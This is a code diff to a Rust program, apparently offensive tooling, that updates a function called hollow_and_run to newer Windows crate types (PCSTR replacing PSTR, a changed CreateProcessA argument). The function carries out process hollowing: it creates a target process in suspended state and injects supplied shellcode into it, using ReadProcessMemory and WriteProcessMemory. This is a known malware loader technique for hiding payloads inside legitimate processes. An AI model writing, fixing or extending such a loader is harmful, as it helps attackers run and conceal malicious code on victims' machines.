@@ -1,7 +1,7 @@
 extern crate windows;
 use std::{mem, ptr};
 use std::ffi::{CString, c_void};
-use windows::Win32::Foundation::PSTR;
+use windows::core::{PCSTR, PSTR};
 use windows::Win32::System::Diagnostics::Debug::{ReadProcessMemory, WriteProcessMemory};
 use windows::Win32::System::Threading::{CreateProcessA, CREATE_SUSPENDED, NtQueryInformationProcess, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION, PROCESSINFOCLASS, ResumeThread, STARTUPINFOA};
 
@@ -44,10 +44,10 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
     // Use CreateProcessW to create a suspended process that will be hollowed out for the shellcode
     // WINDOWS --> https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
     // RUST --> https://microsoft.github.io/windows-docs-rs/doc/windows/Win32/System/Threading/fn.CreateProcessW.html
-    let lp_application_name: PSTR = unsafe { mem::zeroed() };
+    let lp_application_name: PCSTR = unsafe { mem::zeroed() };
     let mut lp_command_line: PSTR = unsafe { mem::zeroed() };
     lp_command_line.0 = CString::new(target_process).unwrap().into_raw() as *mut u8;
-    let lp_current_directory: PSTR = unsafe { mem::zeroed() };
+    let lp_current_directory: PCSTR = unsafe { mem::zeroed() };
     let creation_result = unsafe { CreateProcessA(
         lp_application_name,
         lp_command_line,
@@ -56,7 +56,7 @@ pub fn hollow_and_run(shellcode: &[u8], target_process: &str) {
         false,
         CREATE_SUSPENDED,
         ptr::null() as *const _,
-        &lp_current_directory,
+        lp_current_directory,
         &startup_info,
         &mut process_information) };
     if !creation_result.as_bool() {
